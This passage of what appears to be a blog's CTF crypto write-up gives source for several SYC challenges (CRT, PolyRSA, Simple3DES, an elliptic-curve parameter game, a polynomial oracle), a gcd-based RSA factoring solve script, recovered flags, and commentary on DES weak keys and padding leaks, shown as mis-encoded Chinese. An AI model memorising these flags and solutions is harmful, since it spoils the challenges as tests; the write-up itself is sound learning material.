<span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(CRT_list[c,p])</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="number">37699681561344853433172597523387281471904607566697320008840601281159457436694</span></span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿé¢˜ç›®ç»™çš„ä¸¤ä¸ªå¤šé¡¹å¼ éƒ½æ˜¯p,qçº¿æ€§ç»„åˆçš„å½¢å¼ é‚£ä¹ˆmodnçš„è¯å°±å¯ä»¥æŠŠäº¤å‰é¡¹æ¶ˆæ‰<br>è¿™ç§è·Ÿç¾ŠåŸæ¯æœ‰ä¸€é“ä¸€æ¨¡ä¸€æ ·<br>å±•æˆåªæœ‰p,qå¹‚æ¬¡çš„ä¸¤ä¸ªå¼å­åˆ†åˆ«e2,e1æ¬¡æ–¹<br>ç„¶åä¹˜å¯¹åº”ç³»æ•°æ¶ˆå…ƒ æ±‚ä¸ªgcdå³å¯åˆ†è§£n</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">c1= </span><br><span class="line">c2= </span><br><span class="line">c= </span><br><span class="line">n= </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">kq = (<span class="built_in">pow</span>(c1,e2,n)*<span class="built_in">pow</span>(<span class="number">5</span>,e1*e2,n)-<span class="built_in">pow</span>(c2,e1,n)*<span class="built_in">pow</span>(<span class="number">2</span>,e1*e2,n))</span><br><span class="line">q = gcd(kq,n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p = n//q</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>

<p>æ²¡é¶æœº å°±å•çº¯å­¦ä¹ ä¸€ä¸‹å§~ (æœ€è¿‘è¦æ¶è¡¥äº¤äº’é¢˜ :(  ğŸ«¥qaq )<br>é¢˜ç›®ç»™äº†ä¸ª<a href="https://blog.csdn.net/Mr_wzc/article/details/121713518" target = "_blank">å­¦ä¹ é“¾æ¥ </a><br>é¢˜ç›®ä¸­åœ¨3DESåŠ å¯†ç»“æŸåè¿˜æœ‰ä¸ª <code>ct = xor(des.encrypt(pad(msg,8)),sec)</code> å†xoräº†ä¸€æ¬¡</p>
<h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°çŸ¥è¯†:DESå¼±å¯†é’¥ <a href="https://lightless.me/archives/DES-Weak-Keys.html">https://lightless.me/archives/DES-Weak-Keys.html</a><br>ç”¨è¿™äº›å¼±å¯†é’¥åŠ å¯†ä¼šå¯¼è‡´</p>
<ul>
<li>æ˜æ–‡è¿ç»­åŠ å¯†ä¸¤æ¬¡ä»ç„¶æ˜¯æ˜æ–‡</li>
<li>å¯†æ–‡è¿ç»­è§£å¯†ä¸¤æ¬¡ä»ç„¶æ˜¯å¯†æ–‡</li>
</ul>
<p>é‚£ä¹ˆåˆ©ç”¨3DESä¸€ä¸ªä¸‰æ¬¡æ“ä½œ åŠ å¯†-è§£å¯†-åŠ å¯†   è§£å¯†-åŠ å¯†-è§£å¯†<br>åªè¦æ„é€  <code>key1=key3</code><br>ç¬¬ä¸€æ¬¡äº¤äº’é€‰æ‹© 2:</p>
<ul>
<li>enc(flag,k1)</li>
<li>dec(flag,k2)</li>
<li>enc(flag,k3)</li>
<li>xor(flag,sec)</li>
</ul>
<p>è¿™æ ·ç›¸å½“äºå¾—åˆ°çš„æ˜¯ encflag &#x3D; dec(flag,k2)^sec çš„å€¼</p>
<p>ç¬¬äºŒæ¬¡äº¤äº’é€‰æ‹© 1:</p>
<ul>
<li>enc(encflag,k1)</li>
<li>dec(encflag,k2)</li>
<li>enc(encflag,k3)</li>
<li>xor(encflag,sec)</li>
</ul>
<p>è¿™æ ·å°±å¾—åˆ° dec(dec(flag,k2),k2)^sec^sec &#x3D; flag</p>
<p>è¿™é‡Œé€‰æ‹© å¼±å¯†é’¥æ‹¼æ¥æˆkey (å…¶å®æˆ‘æœ€å¼€å§‹æƒ³çš„ä¸‰ä¸ªkeyå…¨å–ä¸€æ ·ä¹Ÿè¡Œ åªæ˜¯è¦é€‰æ‹©å¼±å¯†é’¥æ¥æ‹¼æ¥)<br><code>key = b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;+b&quot;\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE&quot;+b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;</code></p>
<h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>æ³¨æ„åˆ°åŠ å¯†çš„æ—¶å€™å¯¹msgè¿›è¡Œäº†padå¡«å……<br>æˆ‘ä»¬å‘é€ä¸€ä¸ªç©ºå­—ç¬¦ä¸²è¿‡å»æ—¶</p>
<ul>
<li>sec + bâ€™\x08â€™*8</li>
<li>3DES</li>
<li>xor sec</li>
</ul>
<p>åˆ©ç”¨<code>enc[-8:]</code>æ˜¯3DES(bâ€™\x08â€™*8) xor sec è¿™ä¸€ç‚¹ä¾¿å¯ä»¥åè§£å‡º sec</p>
<p>æ€»ç»“ä¸€ä¸‹å…¶å®å¥½å¤šä¸DES&#x2F;AESç›¸å…³çš„äº¤äº’é¢˜ç ´é¢˜ç‚¹å¸¸å¸¸åœ¨paddingä¸Š (Do not leak your padding status !)</p>
<h2 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®å¤§æ„ï¼š10è½® æ¯æ¬¡ç»™ä¸€æ¡æœªçŸ¥å‚æ•°æ¤­åœ†æ›²çº¿ä¸Šçš„4ä¸ªç‚¹ è¦æ±‚è¿˜åŸå‚æ•°</p>
<p>æˆ‘çš„ç¬¬ä¸€æ€è·¯æ˜¯sageèƒ½ç›´æ¥æ±‚å—? æŠŠåŒä½™å†™æˆç­‰å¼åˆšå¥½å››ä¸ªæ–¹ç¨‹å››ä¸ªæœªçŸ¥æ•° è‚¯å®šæ˜¯èƒ½è§£çš„ :(<br>ç”±äºæ²¡æœ‰ç¯å¢ƒä¹Ÿä¸çŸ¥é“èƒ½ä¸èƒ½æˆ ç„äº†çœ¼å¸ˆå‚…çš„WP æç¤ºç”¨ç±»ä¼¼LCGçš„æ–¹æ³•<br>é‚£ä¹ˆé¦–å…ˆè¿˜åŸp<br>åˆ†åˆ«å–1,2 1,3 1,4 2,3 å››ç»„ç­‰å¼<br>æ¯ç»„å†…ä½œå·®æ¶ˆå»b ç§»é¡¹å¾—åˆ°açš„è¡¨è¾¾å¼<br>å†ä¸¤ç»„è”ç«‹æ¶ˆæ‰a è¿™æ ·å¾—åˆ°ä¸¤ç»„åŒä½™0 modpçš„æ–¹ç¨‹<br>æ±‚gcdå³å¯å¾—åˆ°p<br>ç„¶åè¿˜åŸa,bå°±ç®€å•äº†</p>
<h2 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) 